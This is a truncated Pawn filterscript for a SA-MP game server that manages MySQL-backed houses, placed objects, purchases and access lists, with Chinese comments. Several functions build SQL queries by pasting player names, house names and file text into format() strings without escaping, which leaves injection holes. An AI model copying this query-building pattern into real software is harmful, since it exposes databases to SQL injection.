#include <mkstr>
//P-House定义区
#define PHOUSE_CFG "PHouse/config.cfg" //配置文件的路径
#define PHOUSE_TXTLEN 40 //房子文档名字的最大长度

new MySQL:phousedb;

//P-House Config函数区
new config_Debug=0;//debug模式是否开启,0不开,1开启,配置文件中设置
new config_Noobj=0;//是否禁用文档内的obj,0不禁用,1禁用
new Float:config_Objdis=800.12;//默认OBJ显示距离,如果obj标记中不包含绘制距离,则使用该距离绘制
new config_Autoloadtxt=1;//是否自动加载所有文档,0表示不自动加载,1表示自动加载
new config_Nosell=0;//是否禁用文档内的sell,0不禁用,1禁用
new config_Selldis=20;//默认sell显示距离,如果sell标记中不包含绘制距离，则使用该距离绘制
new config_Acl=1;//是否使用acl,0不使用,1使用
new config_Changeobjcommandrange=3;//默认替换类型obj的操作范围
new config_Nochangeobj=0;//是否禁用文档内的changeobj,0不禁用,1禁用
new config_Nomoveobj=0;//是否禁用文档内的moveobj,0不禁用,1禁用
new config_Moveobjcommandrange=5;//默认移动类型obj的操作范围
new PHouseInitState;

stock LoadConfigValue()
{
	new File:c=fopen(PHOUSE_CFG,io_read),info[512],msg[128],idx=0,v,d;
	while(fread(c,info,512))
		{
			msg=strtok(info,idx);
			v=strval(strtok(info,idx));
			if(mk_strcmp(msg,"Debug")==0) config_Debug=v,d=1;
			if(mk_strcmp(msg,"Noobj")==0) config_Noobj=v,d=1;
			if(mk_strcmp(msg,"Objdis")==0) config_Objdis=v,d=1;
			if(mk_strcmp(msg,"Autoloadtxt")==0) config_Autoloadtxt=v,d=1;
			if(mk_strcmp(msg,"Nosell")==0) config_Nosell=v,d=1;
			if(mk_strcmp(msg,"Selldis")==0) config_Selldis=v,d=1;
			if(mk_strcmp(msg,"Acl")==0) config_Acl=v,d=1;
			if(mk_strcmp(msg,"Changeobjcommandrange")==0) config_Changeobjcommandrange=v,d=1;
			if(mk_strcmp(msg,"Nochangeobj")==0) config_Nochangeobj=v,d=1;
			if(mk_strcmp(msg,"Nomoveobj")==0) config_Nomoveobj=v,d=1;
			if(mk_strcmp(msg,"Moveobjcommandrange")==0) config_Moveobjcommandrange=v,d=1;
			if(d==1) printf("[PHouse]配置:%s %i",msg,v);
			idx=0,d=0;
		}
	fclose(c);
}

stock LoadConfig() {
	if(fexist(PHOUSE_CFG)==0) {
		print("[PHouse]找不到配置文件'config.cfg',将使用默认配置.");
	} else {
		LoadConfigValue();
		print("[PHouse]配置加载完毕,0表示该功能关闭,1表示该功能开启.");
	}
	if(config_Autoloadtxt==1) LoadAllTxt();
}

stock ReLoadConfig() {
	if(fexist(PHOUSE_CFG)==0) {
		print("[PHouse]找不到配置文件'config.cfg',停止重新载入,将使用之前的配置.");
	} else {
		UnLoadAllTxt();
		LoadConfigValue();
		print("[PHouse]配置重载完毕");
		LoadAllTxt();
	}
}

//P-House 普通Obj函数区
#define MAX_OBJ 300000 //OBJ最大数量
enum Objtype{
				obj_dbid,//该普通obj在该文档数据表内的id
				obj_txt[PHOUSE_TXTLEN],//该普通obj所属文档
				obj_mod,//该普通obj的模型
				obj_id,//普通obj创建的返回id
				Float:obj_x,//....x
				Float:obj_y,//....y
				Float:obj_z,//....z
				Float:obj_rx,//....rx
				Float:obj_ry,//....ry
				Float:obj_rz,//....rz
				Float:obj_dis};//....显示距离

new p_Obj[MAX_OBJ][Objtype];//普通OBJ数组
new ph_n_obj_count=0;

stock AddObj(str[],txt[],dbid)//添加一只普通obj 
{
	new id=-1;
	if(PHouseInitState == 0) {
		id = ph_n_obj_count;
		ph_n_obj_count ++;
	} else {
		for(new i=0;i<MAX_OBJ;i++) {
			if(p_Obj[i][obj_dbid]==0) {
				id=i;
				i=MAX_OBJ+1;
			}
		}
	}
	if(id==-1) return print("[PHouse]普通OBJ数量已达上线,加载失败");
	p_Obj[id][obj_dbid]=dbid;
	format(p_Obj[id][obj_txt],PHOUSE_TXTLEN,"%s",txt);
	sscanf(str, "d f f f f f f f", p_Obj[id][obj_mod], p_Obj[id][obj_x], p_Obj[id][obj_y], p_Obj[id][obj_z], p_Obj[id][obj_rx], p_Obj[id][obj_ry], p_Obj[id][obj_rz], p_Obj[id][obj_dis]);
	//if(p_Obj[id][obj_dis]<=0) 
	p_Obj[id][obj_dis]=config_Objdis;
	if(config_Noobj==0) {
		p_Obj[id][obj_id]=CreateDynamicObjectEx(p_Obj[id][obj_mod],p_Obj[id][obj_x],p_Obj[id][obj_y],p_Obj[id][obj_z],p_Obj[id][obj_rx],p_Obj[id][obj_ry],p_Obj[id][obj_rz],p_Obj[id][obj_dis],p_Obj[id][obj_dis]);
	}
	return 1;
}

stock AddMaterial(value[]) {
	new id;
	if(PHouseInitState == 0) {
		id = ph_n_obj_count-1;
	} else {
		for(new i=0;i<MAX_OBJ;i++) {
			if(p_Obj[i][obj_dbid]==0) {
				id=i-1;
				i=MAX_OBJ+1;
			}
		}
	}
	new index, modelid, txdname[MAX_PLAYER_NAME], texturename[256], color[MAX_PLAYER_NAME], idx;
	index = strval(strtok(value, idx));
	modelid = strval(strtok(value, idx));
	format(txdname, sizeof txdname, strtok(value, idx));
	format(texturename, sizeof texturename, strtok(value, idx));
	format(color, sizeof color, strtok(value, idx));
	SetDynamicObjectMaterial(p_Obj[id][obj_id], index, modelid, txdname, texturename, HexToInt(color));
}

stock HexToInt(string[]) {
  if(!string[0]) return 0;
  new cur = 1, res = 0;
  for(new i = strlen(string); i > 0; i--) {
    res += cur * (string[i - 1] - ((string[i - 1] < 58) ? (48) : (55)));
    cur = cur * 16;
  }
  return res;
}

stock RedObj(index)
{
	new id=index;
	if(p_Obj[id][obj_dbid]==0) return 1;
	p_Obj[id][obj_dbid]=0;
	format(p_Obj[id][obj_txt],PHOUSE_TXTLEN,"");
	if(p_Obj[id][obj_id]!=0) DestroyDynamicObject(p_Obj[id][obj_id]),p_Obj[id][obj_id]=0;
	return 1;
}

stock RedAllObj(txt[])
{
	for(new i=0;i<MAX_OBJ;i++)
	    {
	        if(mk_strcmp(p_Obj[i][obj_txt],txt)==0)
	            {
	                RedObj(i);
	            }
	    }
}


//P-House 加载函数区
#define MAX_LOADTXT 500//最大文档加载数量
enum Loadtype {
	load_name[PHOUSE_TXTLEN],//文档名字
	load_id
};//文档在数据库中的id
new p_Txtlist[MAX_LOADTXT][Loadtype];//文档列表

stock LoadTxt(dbid, txt[]) {
	if(IsLoadTxt(txt)!=-1) return printf("[PHouse]文档'%s'加载失败,因为他已经被加载了",txt);
	new id=-1;
	for(new i=0;i<MAX_LOADTXT;i++) {
	  if(p_Txtlist[i][load_id]==0) {
	    id=i;
	    i=MAX_LOADTXT+1;
	  }
	}
	if(id==-1) return print("[PHouse]文档数量已达上线,加载失败");
	format(p_Txtlist[id][load_name],PHOUSE_TXTLEN,"%s",txt);
	p_Txtlist[id][load_id]=dbid;
	new msg[128];
	mysql_format(phousedb, msg, sizeof(msg), "SELECT * FROM phouse.%i", dbid);
	mysql_tquery(phousedb, msg, "LoadTxtThread", "sd", txt, dbid);
	return 1;
}

forward LoadTxtThread(txt[], dbid);
public LoadTxtThread(txt[], dbid) {
	new rows = cache_num_rows(), sellf=0, did, msg[64], value[256];
	for(new i=0;i<rows;i++) {
		cache_get_value_index_int(i, 0, did);
		cache_get_value_index(i, 1, msg, sizeof msg);
		cache_get_value_index(i, 2, value, sizeof value);
		if(mk_strcmp(msg,"obj")==0) AddObj(value,txt,did);
		if(mk_strcmp(msg,"sell")==0&&sellf==0) AddSell(dbid,txt,value,did),sellf=1;
		if(mk_strcmp(msg,"changeobj")==0) AddChangeObj(txt,value,did);
		if(mk_strcmp(msg,"moveobj")==0) AddMoveObj(txt,value,did);
		if(mk_strcmp(msg,"material")==0) AddMaterial(value);
	}
	Streamer_UpdateAll();
	return 1;
}

stock UnLoadTxt(txt[])
{
	new id=IsLoadTxt(txt),t=GetTickCount();
	if(id==-1) return printf("[PHouse]文档'%s'卸载失败,因为他没有被加载",txt);
	format(p_Txtlist[id][load_name],PHOUSE_TXTLEN,"");
	p_Txtlist[id][load_id]=0;
	//删除该文档内的所有普通obj
	RedAllObj(txt);
	//删除该文档内的所有sell
	RedAllSell(txt);
	//删除该文档内的所有替换类obj
	RedAllChangeObj(txt);
	//删除该文档内的所有移动类obj
	RedAllMoveObj(txt);
	printf("[PHouse]卸载文档'%s'完成,耗时:%ims",txt,GetTickCount()-t);
	return 1;
}

stock IsLoadTxt(txt[]) {
	new id=-1;
	for(new i=0;i<MAX_LOADTXT;i++) {
		if(mk_strcmp(p_Txtlist[i][load_name],txt)==0) {
			id=i;
			i=MAX_LOADTXT+1;
		}
	}
	return id;
}

stock GetLoadTxt()
{
	printf("[PHouse]已加载文档列表:");
	new s=0;
	for(new i=0;i<MAX_LOADTXT;i++)
	    {
	        if(mk_strcmp(p_Txtlist[i][load_name],"")!=0)
	            {
	                printf("[PHouse]文档名称:%s,文档数据库表ID:%i,文档索引:%i",p_Txtlist[i][load_name],p_Txtlist[i][load_id],i);
					s++;
				}
	    }
	printf("[PHouse]共%i个",s);
}

stock LoadAllTxt() {
	new Cache:result,s,msg[64], id;
	format(msg, sizeof msg, "SELECT * FROM main");
	result = mysql_query(phousedb, msg);
	cache_get_row_count(s);
	for(new i=0;i<s;i++) {
		cache_get_value_index_int(i, 0, id);
		cache_get_value_index(i, 1, msg, sizeof msg);
		LoadTxt(id, msg);
	}
	cache_delete(result);
}

stock UnLoadAllTxt()
{
	new msg[128];
	for(new i=0;i<MAX_LOADTXT;i++)
	    {
			if(mk_strcmp(p_Txtlist[i][load_name],"")!=0)
			    {
			        format(msg,128,"%s",p_Txtlist[i][load_name]);
					UnLoadTxt(msg);
			    }
	    }
}

//P-House 安装(导入)函数区
stock Installation(txt[]) {
	new file[128];
	format(file,128,"PHouse/txt/%s.txt",txt);
	if(fexist(file)==0) {
		return printf("[PHouse]找不到文档'%s',停止安装'%s'",txt,txt);
	} else {
		if(IsTxtInstallation(txt)!=0) return printf("[PHouse]文档'%s'停止安装,因为该文档已经被安装过了",txt);
		new File:c=fopen(file,io_read),info[1024],msg[512],idx=0,t=GetTickCount(),iid;
		mysql_query(phousedb, "begin", false);
		format(msg,512,"INSERT INTO main (txtname) VALUES ('%s')",txt);
		mysql_query(phousedb, msg, false);
		iid=GetTxtInstallationId(txt);
		format(msg,512,"CREATE TABLE phouse.%d (id int PRIMARY KEY AUTO_INCREMENT,type varchar(255),value varchar(255));",iid);
		mysql_query(phousedb, msg, false);
		new allmsg[64],jump=0,one,two;
		format(allmsg,64,"");
		while(fread(c,info,1024)) {
			msg=strtok(info,idx);
			if(mk_strcmp(msg,"allobj")==0) format(allmsg,64,"obj"),jump=1;
			if(mk_strcmp(msg,"allchangeobj")==0) format(allmsg,64,"changeobj"),jump=1;
			if(mk_strcmp(msg,"allmoveobj")==0) format(allmsg,64,"moveobj"),jump=1;
			one=msg[0];
			two=msg[1];
			if(one==47) {
				if(two==47) jump=1;
			}
			//if(mk_strcmp(msg,"//")!=0&&mk_strcmp(msg,"user")!=0&&mk_strcmp(msg,"name")!=0&&mk_strcmp(msg,"")!=0&&jump==0)
			if(mk_strcmp(msg,"//")!=0&&mk_strcmp(msg,"name")!=0&&mk_strcmp(msg,"")!=0&&jump==0) {
		 		if(CheckVar(msg)==1) {
		 			format(msg,512,"INSERT INTO phouse.%i (type,value) VALUES ('%s','%s %s')",iid,allmsg,msg,strrest(info,idx));
		 		} else {
					format(msg,512,"INSERT INTO phouse.%i (type,value) VALUES ('%s','%s')",iid,msg,strrest(info,idx));
				}
				//print(msg);
				mysql_query(phousedb, msg, false);
			}
			idx=0;
			jump=0;
		}
		fclose(c);
		mysql_query(phousedb, "commit", false);
		printf("[PHouse]文档'%s'已安装",txt);
		format(msg,512,"[PHouse]文档'%s'安装耗时:%ims",txt,GetTickCount()-t);
		DebugMsg(msg);
		LoadTxt(iid, txt);
		return 1;
	}
}

stock UnInstallation(txt[])
{
	if(IsTxtInstallation(txt)==0) return printf("[PHouse]文档'%s'停止删除，因为该文档没有被安装",txt);
	if(IsLoadTxt(txt)!=-1) return printf("[PHouse]文档'%s'停止删除,因为该文档没有被卸载",txt);
	new msg[512],t=GetTickCount(), tableid = GetTxtInstallationId(txt);
	mysql_query(phousedb, "begin", false);
	format(msg,512,"DELETE FROM main WHERE txtname = '%s';",txt);
	mysql_query(phousedb, msg, false);
	format(msg,512,"DROP TABLE phouse.%i", tableid);
	mysql_query(phousedb, msg, false);
	mysql_query(phousedb, "commit", false);
	printf("[PHouse]文档'%s'已删除",txt);
	format(msg,128,"[PHouse]删除文档'%s'耗时:%ims",txt,GetTickCount()-t);
	DebugMsg(msg);
	return 1;
}

stock IsTxtInstallation(txt[])
{
	new Cache:result,s,msg[512];
	format(msg,512,"SELECT * FROM main WHERE txtname='%s'",txt);
	result = mysql_query(phousedb, msg);
	cache_get_row_count(s);
	cache_delete(result);
	return s;
}

stock GetTxtInstallationId(txt[])
{
	new Cache:result,s,msg[256];
	format(msg, sizeof msg,"SELECT * FROM main WHERE txtname='%s'",txt);
	result = mysql_query(phousedb, msg);
	cache_get_value_index_int(0, 0, s);
	cache_delete(result);
	return s;
}


//P-House sell函数区
//1273 - 绿牌子
//1272 - 蓝牌子
#define MAX_SELL MAX_LOADTXT//最大出售牌子数量(与最大文档数量相等,一个文档仅有一个sell能生效)
#define MAX_SELL_NAME 60//最大sell名字长度
enum Selltype{
				sell_pid,//房子在游戏内的ID - 数据库ID
				sell_dbid,//该房子在文档库中的id
				sell_txt[PHOUSE_TXTLEN],//该房子所属文档
				sell_player[MAX_PLAYER_NAME],//...所有者
				sell_name[MAX_SELL_NAME],//sell的名字
				sell_money,//...价格
				sell_pickupid,//...pickupid
				Text3D:sell_text,//...3dtxt提示
				sell_resale,//转卖
				Float:sell_x,//...x
				Float:sell_y,//...y
				Float:sell_z,//...z
				Float:sell_dis};//...距离
new p_Sell[MAX_SELL][Selltype];//出售标记的数组

stock PHouse_Recycling(uid, name[]) {
	for(new i = 0; i < MAX_SELL; i ++) {
		if(p_Sell[i][sell_pid] != 0) {
			if(strcmp(p_Sell[i][sell_player], name) == 0 && p_Sell[i][sell_money] != 0) {
				RedAllPlayerToTxt(p_Sell[i][sell_txt]);
				AddPlayerToTxt("sys", p_Sell[i][sell_txt]);
				ChangeSellPlayer(i, "");
				new msg[256], tid=IsLoadTxt(p_Sell[i][sell_txt]);
				format(msg, sizeof msg, "%d %.3f %.3f %.3f %.3f 0", p_Sell[i][sell_money], p_Sell[i][sell_x], p_Sell[i][sell_y], p_Sell[i][sell_z], p_Sell[i][sell_dis]);
				format(msg, sizeof msg,"UPDATE phouse.%d SET value='%s' WHERE type='sell'",p_Txtlist[tid][load_id], msg);
				mysql_query(phousedb, msg, false);
				UpDataSellPickup(i);
				GiveMoneyOffline(name, p_Sell[i][sell_money]/2);
				format(msg, sizeof msg, "回收房子ID:%d", p_Sell[i][sell_pid]);
				log_money(name, "none", uid, "phouse", "回收房子", 0, p_Sell[i][sell_money]/2, msg);
			}
		}
	}
}


stock PHouseGetOwnerForUCP(name[]) {
	new msg[256], count = 0;
	for(new i = 0; i < MAX_SELL; i ++) {
		if(p_Sell[i][sell_dbid] != 0) {
			if(mk_strcmp(p_Sell[i][sell_player], name) == 0) {
				if(p_Sell[i][sell_money] == 0) {
					format(msg, sizeof msg, "%sSRF_%d, ", msg, p_Sell[i][sell_pid]);
				} else {
					format(msg, sizeof msg, "%sFZ_%d, ", msg, p_Sell[i][sell_pid]);
				}
				count ++;
			}
		}
	}
	if(count == 0) {
		format(msg, sizeof msg, "无");
	}
	return msg;
}

stock ChangeSellPlayer(index,newplayer[])
{
	format(p_Sell[index][sell_player],MAX_PLAYER_NAME,"%s",newplayer);
	new msg[512],tid=IsLoadTxt(p_Sell[index][sell_txt]),t=GetTickCount();
	format(msg,512,"UPDATE phouse.%i SET value = '%s' WHERE type = 'user'",p_Txtlist[tid][load_id],p_Sell[index][sell_player]);
	mysql_query(phousedb, msg, false);
	UpDataSellPickup(index);
	format(msg,512,"[PHouse]修改文档'%s'的牌子完成,耗时:%ims",p_Txtlist[tid][load_name],GetTickCount()-t);
	DebugMsg(msg);

}

stock GetSellPlayer(txt,txtname[]) {
	new Cache:result,s,msg[512],st=GetTickCount(),rm[MAX_PLAYER_NAME];
	format(msg,512,"SELECT COUNT(id) as counts FROM phouse.%i WHERE type='user'",txt);
	result = mysql_query(phousedb, msg);
	cache_get_value_index_int(0, 0, s);
	cache_delete(result);
	if(s==0) {
	  format(msg,512,"INSERT INTO phouse.%i (type,value) VALUES ('user','0')",txt);
	  mysql_query(phousedb, msg, false);
	  format(rm,MAX_PLAYER_NAME,"0");
	} else {
		format(msg,512,"SELECT value FROM phouse.%i WHERE type='user'",txt);
		result = mysql_query(phousedb, msg);
		cache_get_value_index(0, 0, rm, MAX_PLAYER_NAME);
		cache_delete(result);
	}
	format(msg,512,"[PHouse]文档'%s'查询所有者完成,耗时:%ims",txtname,GetTickCount()-st);
	DebugMsg(msg);
	return rm;
}

stock ChangeSellName(index,newname[])
{
	if(mk_strlen(newname)>=MAX_SELL_NAME) return -1;
	format(p_Sell[index][sell_name],MAX_SELL_NAME,"%s",newname);
	new msg[512],tid=IsLoadTxt(p_Sell[index][sell_txt]),at=GetTickCount();
	format(msg,512,"UPDATE phouse.%i SET value = '%s' WHERE type = 'name'",p_Txtlist[tid][load_id],p_Sell[index][sell_name]);
	mysql_query(phousedb, msg, false);
	UpDataSellPickup(index);
	format(msg,512,"[PHouse]修改文档'%s'的姓名完成,耗时:%ims",p_Txtlist[tid][load_name],GetTickCount()-at);
	DebugMsg(msg);
	return 1;
}
stock GetSellName(txt,txtname[])
{
	new Cache:result,s,msg[512],t=GetTickCount(),rm[MAX_SELL_NAME];
	format(msg,512,"SELECT * FROM phouse.%i WHERE type='name'",txt);
	result = mysql_query(phousedb, msg);
	cache_get_row_count(s);
	if(s==0) {
	  format(msg,512,"INSERT INTO phouse.%i (type,value) VALUES ('name','')",txt);
	  mysql_query(phousedb, msg, false);
	  format(rm,MAX_SELL_NAME,"");
	} else {
		cache_get_value_index(0, 2, rm, MAX_SELL_NAME);
	}
	cache_delete(result);
	format(msg,512,"[PHouse]文档'%s'查询sell姓名完成,耗时:%ims",txtname,GetTickCount()-t);
	DebugMsg(msg);
	return rm;
}

new ph_n_sell_count=0;

stock AddSell(txtid,txt[],value[],dbid)
{
	new id=-1;
	if(PHouseInitState == 0) {
		id = ph_n_sell_count;
		ph_n_sell_count ++;
	} else {
		for(new i=0;i<MAX_SELL;i++) {
			if(p_Sell[i][sell_dbid]==0) {
				id=i;
				i=MAX_SELL+1;
			}
		}
	}
	if(id==-1) return print("[PHouse]出售标记已达上限,添加失败");
	p_Sell[id][sell_pid] = txtid;
	//printf("PHOUSE -> 房子ID: %d", txtid);
	p_Sell[id][sell_dbid]=dbid;
	format(p_Sell[id][sell_txt],PHOUSE_TXTLEN,"%s",txt);
	sscanf(value, "d f f f f d", p_Sell[id][sell_money], p_Sell[id][sell_x], p_Sell[id][sell_y], p_Sell[id][sell_z], p_Sell[id][sell_dis], p_Sell[id][sell_resale]);
	format(p_Sell[id][sell_player], MAX_PLAYER_NAME, "%s",GetSellPlayer(txtid,txt));
	format(p_Sell[id][sell_name],MAX_SELL_NAME,"%s",GetSellName(txtid,txt));
	if(p_Sell[id][sell_dis]<=0) p_Sell[id][sell_dis]=config_Selldis;
	if(config_Nosell==0) {
		p_Sell[id][sell_text]=CreateDynamic3DTextLabelEx(" ",0x98CDFEFF,p_Sell[id][sell_x],p_Sell[id][sell_y],p_Sell[id][sell_z],p_Sell[id][sell_dis],INVALID_PLAYER_ID, INVALID_VEHICLE_ID,0,p_Sell[id][sell_dis]);
		UpDataSellPickup(id);
	}
	return 1;
}

stock RedSell(index)
{
	new id=index;
	if(p_Sell[id][sell_dbid]==0) return 1;
	p_Sell[id][sell_dbid]=0;
	p_Sell[id][sell_pid]=0;
	format(p_Sell[id][sell_txt],PHOUSE_TXTLEN,"");
	DestroyDynamic3DTextLabel(p_Sell[id][sell_text]);
	if(p_Sell[id][sell_pickupid]!=0)
	    {
	         DestroyDynamicPickup(p_Sell[id][sell_pickupid]);
	         p_Sell[id][sell_pickupid]=0;
	    }
	return 1;
}

stock GetSellMax()
{
	new s=0;
	for(new i=0;i<MAX_SELL;i++)
	    {
	        if(p_Sell[i][sell_dbid]!=0)
	            {
	                s++;
	            }
	    }
	return s;
}

stock GotoSell(playerid,index) {
	for(new i = 0; i < MAX_SELL; i++) {
	    if(p_Sell[i][sell_dbid] != 0 && p_Sell[i][sell_pid] == index) {
			SetPlayerPos(playerid,p_Sell[i][sell_x], p_Sell[i][sell_y], p_Sell[i][sell_z]);
			return i;
		}
	}
	return -1;
}

stock GetPlayerInSell(playerid)
{
	if(config_Nosell==1) return -2;
	new id=-1;
	for(new i=0;i<MAX_SELL;i++)
	    {
	        if(p_Sell[i][sell_dbid]!=0)
	            {
	                if(GetPlayerDistanceFromPoint(playerid,p_Sell[i][sell_x],p_Sell[i][sell_y],p_Sell[i][sell_z])<=1)
	                    {
	                		id=i;
	                		i=MAX_SELL+1;
						}
	            }
	    }
	return id;
}

stock GetPlayerHouseCount(playerid) {
	new count = 0, name[MAX_PLAYER_NAME];
	format(name, sizeof name, GetName(playerid));
	for(new i = 0; i < MAX_SELL; i ++) {
		if(mk_strcmp(p_Sell[i][sell_player], name)==0 && p_Sell[i][sell_money] != 0) {
			count ++;
		}
	}
	return count;
}

stock GetPlayerHouseStats(playerid) {
	new msg[256], name[MAX_PLAYER_NAME];
	format(name, sizeof name, GetName(playerid));
	for(new i = 0; i < MAX_SELL; i ++) {
		if(p_Sell[i][sell_dbid] != 0) {
			if(mk_strcmp(p_Sell[i][sell_player], name)==0) {
				if(p_Sell[i][sell_money] == 0) {
					format(msg, sizeof msg, "%s私人房ID:%d\n", msg, p_Sell[i][sell_pid]);
				} else {
					format(msg, sizeof msg, "%s拥有房子ID:%d\n", msg, p_Sell[i][sell_pid]);
				}
			}
		}
	}
	return msg;
}

stock BuySell(playerid,index)
{
	new pmoney=GetMoney(playerid);
	if(pmoney<p_Sell[index][sell_money]) return -1;
	new name[MAX_PLAYER_NAME], msg[128];
	GetPlayerName(playerid,name,MAX_PLAYER_NAME);
	GiveMoney(playerid,-p_Sell[index][sell_money]);
	AddPlayerToTxt(name,p_Sell[index][sell_txt]);
	ChangeSellPlayer(index,name);
	format(msg, sizeof msg, "购买房子ID:%d", p_Sell[index][sell_pid]);
	log_money(GetName(playerid), GetIp(playerid), GetPlayerUID(playerid), "phouse", "在线记录", 0, -p_Sell[index][sell_money], msg);
	return 1;
}

stock SellSell(playerid,index)
{
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid,name,MAX_PLAYER_NAME);
	if(mk_strcmp(name,p_Sell[index][sell_player])!=0) return -1;
	GiveMoney(playerid,p_Sell[index][sell_money]/2);
	RedAllPlayerToTxt(p_Sell[index][sell_txt]);
	AddPlayerToTxt("sys",p_Sell[index][sell_txt]);
	ChangeSellPlayer(index,"0");
	new msg[256], tid=IsLoadTxt(p_Sell[index][sell_txt]);
	format(msg, sizeof msg, "%d %.3f %.3f %.3f %.3f %d",
	p_Sell[index][sell_money], p_Sell[index][sell_x], p_Sell[index][sell_y], p_Sell[index][sell_z], p_Sell[index][sell_dis], 0);
	format(msg, sizeof msg,"UPDATE phouse.%d SET value='%s' WHERE type='sell'",p_Txtlist[tid][load_id], msg);
	mysql_query(phousedb, msg, false);
	format(msg, sizeof msg, "出售房子ID:%d", p_Sell[index][sell_pid]);
	log_money(GetName(playerid), GetIp(playerid), GetPlayerUID(playerid), "phouse", "在线记录", 0, p_Sell[index][sell_money]/2, msg);
	return 1;
}

stock UpDataSellPickup(index) {
	new id=index;
	if(p_Sell[id][sell_pickupid]!=0) {
   		DestroyDynamicPickup(p_Sell[id][sell_pickupid]);
      	p_Sell[id][sell_pickupid]=0;
   	}
   	new pid=1273,sm[256];
	if(p_Sell[id][sell_money] == 0) {
		format(sm,sizeof sm,"{FFFF00}%s\n房子ID:%d\n%s的私人房", p_Sell[id][sell_name], p_Sell[id][sell_pid], p_Sell[id][sell_player]);
	} else if(mk_strcmp(p_Sell[id][sell_player],"0")==0) {
		format(sm,sizeof sm,"{00FF00}出售中\n{FFFF00}~价格:{00FFFF}%i{FFFF00}~\n{FFFF00}~购买:{FF00FF}/buyhouse{FFFF00}~\n{FFFF00}~房子ID:{00FFFF}%i",p_Sell[id][sell_money], p_Sell[id][sell_pid]);
	} else {
		if(p_Sell[id][sell_resale] != 0) {
   			format(sm,sizeof sm,"%s\n{FFFF00}房子ID:{00FFFF}%d\n{FFFF00}拥有者:{00FFFF}%s\n{FFFF00}房子价值:{00FFFF}%d$\n{FFFF00}转卖:%d\n{FFFF00}~购买输入:{FF00FF}/buyhouse{FFFF00}~", p_Sell[id][sell_name], p_Sell[id][sell_pid], p_Sell[id][sell_player], p_Sell[id][sell_money], p_Sell[id][sell_resale]);
		} else {
			format(sm,sizeof sm,"%s\n{FFFF00}房子ID:{00FFFF}%d\n{FFFF00}拥有者:{00FFFF}%s\n{FFFF00}房子价值:{00FFFF}%d$", p_Sell[id][sell_name], p_Sell[id][sell_pid], p_Sell[id][sell_player], p_Sell[id][sell_money]);
		}
	}
    UpdateDynamic3DTextLabelText(p_Sell[id][sell_text],0x98CDFEFF,sm);
   	p_Sell[id][sell_pickupid]=CreateDynamicPickupEx(pid,1,p_Sell[id][sell_x],p_Sell[id][sell_y],p_Sell[id][sell_z],p_Sell[id][sell_dis]);
    Streamer_UpdateAll();
}
stock RedAllSell(txt[])
{
	for(new i=0;i<MAX_SELL;i++)
	    {
	        if(mk_strcmp(p_Sell[i][sell_txt],txt)==0)
	            {
	                RedSell(i);
	            }
	    }
}

//P-House Acl(文档权限)函数区
#define MAX_PAGES 20 //权限管理列表每页显示多少个人
#define DIALOG_PHOUSE	(700)
#define DIALOG_ACL_LIST DIALOG_PHOUSE//显示权限列表的对话框ID
#define DIALOG_HOUSE_CHANGENAME	DIALOG_PHOUSE + 1
#define DIALOG_HOUSE_LIST		DIALOG_PHOUSE + 2
stock GetPages(s)
{
	new p=s%MAX_PAGES,ps;
	if(p==0)
	    {
	        ps=s/MAX_PAGES;
	    }
	else
	    {
	        ps=(s/MAX_PAGES)+1;
	    }
	return ps;
}
stock GetTxtPlayer(txt[])
{
	new Cache:result,s,msg[512],tid=IsLoadTxt(txt);
	format(msg,512,"SELECT * FROM phouse.%i WHERE type='player'",p_Txtlist[tid][load_id]);
	result = mysql_query(phousedb, msg);
	cache_get_row_count(s);
	cache_delete(result);
	return s;
}

stock ShowAclList(playerid,txt[]) {
	new msg[1024],info[512],title[96],uid,nowpage=GetPVarInt(playerid,"PHouse_AclList_NowSelect"),maxpage=GetPages(GetTxtPlayer(txt));
	new Cache:result,s,tid=IsLoadTxt(txt),startid,endid;
	if(maxpage==0) maxpage=1,format(msg,1024,"* 该文档的权限表为空..\n* 添加权限请用/adp");
	if(nowpage>maxpage) {
	  nowpage=maxpage;
	  SetPVarInt(playerid,"PHouse_AclList_NowSelect",maxpage);
	}
	startid=MAX_PAGES*(nowpage-1);
	endid=MAX_PAGES*nowpage;
	if(nowpage!=1) format(msg,1024,"上一页");
	format(info,512,"SELECT * FROM phouse.%i WHERE type='player'",p_Txtlist[tid][load_id]);
	result = mysql_query(phousedb, info);
	cache_get_row_count(s);
	for(new i=0;i<s;i++) {
	  if(i>=startid) {
	    if(i<endid) {
				cache_get_value_index(i, 2, info, sizeof info);
				uid=ReturnPlayerId(info);
				if(uid==-1) {
	        format(msg,1024,"%s\n%s",msg,info);
				} else {
					format(msg,1024,"%s\n{98CDFE}%s [当前在线,ID:%i]{FFFFFF}",msg,info,uid);
				}
	    }
	  }
	}
	cache_delete(result);
	if(nowpage!=maxpage) format(msg,1024,"%s\n下一页",msg);
	format(title,96,"权限列表,共%i名,当前第%i页,共%i页",GetTxtPlayer(txt),nowpage,maxpage);
	ShowPlayerDialog(playerid,DIALOG_ACL_LIST,DIALOG_STYLE_LIST,title,msg,"删除","关闭");
}

stock AddPlayerToTxt(player[],txt[]) {
	new Cache:result,s,msg[512],tid=IsLoadTxt(txt);
	format(msg,512,"SELECT * FROM phouse.%i WHERE type='player' and value='%s'",p_Txtlist[tid][load_id],player);
	result = mysql_query(phousedb, msg);
	cache_get_row_count(s);
	cache_delete(result);
	if(s==0) {
		format(msg,512,"INSERT INTO phouse.%i (type,value) VALUES ('player','%s')",p_Txtlist[tid][load_id],player);
		mysql_query(phousedb, msg, false);
		return 1;
	}
	return -1;
}
stock RedPlayerToTxt(player[],txt[])
{
	new Cache:result,s,msg[512],tid=IsLoadTxt(txt);
	format(msg,512,"SELECT * FROM phouse.%i WHERE type='player' and value='%s'",p_Txtlist[tid][load_id],player);
	result = mysql_query(phousedb, msg);
	cache_get_row_count(s);
	cache_delete(result);
	if(s==0) return -1;
	format(msg,512,"DELETE FROM phouse.%i WHERE type = 'player' and value='%s'",p_Txtlist[tid][load_id],player);
	mysql_query(phousedb, msg, false);
	return 1;
}

stock RedAllPlayerToTxt(txt[])
{
	new msg[512],tid=IsLoadTxt(txt);
	format(msg,512,"DELETE FROM phouse.%i WHERE type = 'player'",p_Txtlist[tid][load_id]);
	mysql_query(phousedb, msg, false);
}

stock GetPlayerAclFromTxt(player[],txt[]) {
	if(config_Acl==0) return 1;
	new Cache:result,s,msg[256],tid=IsLoadTxt(txt);
	format(msg, 256,"SELECT * FROM phouse.%i WHERE type='player' and value='*'",p_Txtlist[tid][load_id]);
	result = mysql_query(phousedb, msg);
	cache_get_row_count(s);
	cache_delete(result);
	if(s!=0) return 1;
